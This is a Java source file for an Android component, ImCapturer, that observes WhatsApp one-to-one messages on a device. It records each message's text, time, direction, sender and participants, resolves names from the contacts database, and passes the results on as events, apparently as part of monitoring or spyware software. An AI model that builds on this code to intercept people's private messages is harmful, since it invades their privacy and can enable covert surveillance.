package com.vvt.im;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMEvent;
import com.vvt.events.FxIMServiceType;
import com.vvt.events.FxParticipant;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;
import com.vvt.whatsapp.WhatsAppImData;
import com.vvt.whatsapp.WhatsAppObserver;
import com.vvt.whatsapp.WhatsAppObserverManager;

public class ImCapturer implements 
		WhatsAppObserver.OnCaptureListenner {
	
	private static final String TAG = "ImCapturer";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	private Context mContext;
	
	private WhatsAppObserverManager mWaObserver;
	private FxEventListener mFxEventListner;
	private boolean mIsWorking;
	private String mWritablepath;
	
	public ImCapturer(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
	}
	
	public void registerObserver(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregisterObserver() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException("Capturing is working, please call stopCapture before unregister.");
		}
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startObserver() throws FxNullNotAllowedException {
		
		
		if(LOGV) FxLog.v(TAG, "startObserver # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if(mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if(LOGV) FxLog.v(TAG, "startObserver # mIsWorking ..." + mIsWorking);
		if (!mIsWorking) {
			mIsWorking = true;
			if(LOGV) FxLog.v(TAG, "startObserver # begin starting observer... " + mIsWorking);
			mWaObserver = WhatsAppObserverManager.getWhatsAppObserverManager();
			mWaObserver.setLoggablePath(mWritablepath);
			mWaObserver.setDateFormat(DATE_FORMAT);
			if (mWaObserver != null) mWaObserver.registerWhatsAppObserver(this);
		}
		
		if(LOGV) FxLog.v(TAG, "startObserver # Exit ...");
	}
	
	public void stopObserver() {
		if (mWaObserver != null) mWaObserver.unregisterWhatsAppObserver();
		mIsWorking = false;
		
	}
	
	@Override
	public void onReceiveNewWhatsAppMessages(ArrayList<WhatsAppImData> captureResults) {
		
		if(LOGV) FxLog.v(TAG, "onCapture # ENTER ...");
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxIMEvent event = null;
		ArrayList<String> contacts = null;
		ArrayList<FxParticipant> participants = null;
		String[] participantUids = null;
		String[] participantNames = null;
		
		
		for (WhatsAppImData data : captureResults) {
			if (data.isGroupChat()) continue;
			
			contacts = new ArrayList<String>();
			String contactName = null;
			participants = new ArrayList<FxParticipant>();
			FxParticipant participant = null;
			
			for (String contact : data.getParticipantUids()) {
				participant = new FxParticipant();
				
				contactName = ContactsDatabaseManager.getContactNameByPhone(contact);
				if (contactName == null || contactName.trim().length() < 1) {
					contacts.add(contact);
				}
				else {
					contacts.add(contactName);
				}
				
				participant.setName(contactName);
				participant.setUid(contact);
				participants.add(participant);
			}
			 
			String ownerName = data.getOwner();
			if (ownerName == null || ownerName.trim().length() < 1) {
				ownerName = data.getOwnerUid();
				if (ownerName == null) ownerName = "";
			}
			
			String speakerName = data.getSpeakName();
			
			if (speakerName == null || speakerName.trim().length() < 1) {
				String speakerUid = data.getSpeakerUid();
				if (speakerUid != null && speakerUid.trim().length() > 0) {
					speakerName = ContactsDatabaseManager.getContactNameByPhone(speakerUid);
					if (speakerName == null) {
						speakerName = speakerUid;
					}
				}
			}
			
			participantUids = new String[data.getParticipantUids().size()];
			data.getParticipantUids().toArray(participantUids);
			
			participantNames = new String[contacts.size()];
			contacts.toArray(participantNames);
			
			FxEventDirection direction = data.isSent() ? FxEventDirection.OUT : FxEventDirection.IN;
			
			event = new FxIMEvent();
			event.setEventDirection(direction);
			event.setEventTime(data.getTime());
			event.setImServiceId(FxIMServiceType.IM_WHATSAPP.getValue());
			event.setMessage(data.getData());
			event.setUserDisplayName(speakerName);
			event.setUserId(data.getSpeakerUid());
			for(FxParticipant p : participants) {
				event.addParticipant(p);
			}
			
			events.add(event);
			
		}
		
		this.mFxEventListner.onEventCaptured(events); 
		
		if(LOGV) FxLog.v(TAG, "onCapture # EXIT ...");
	}
}
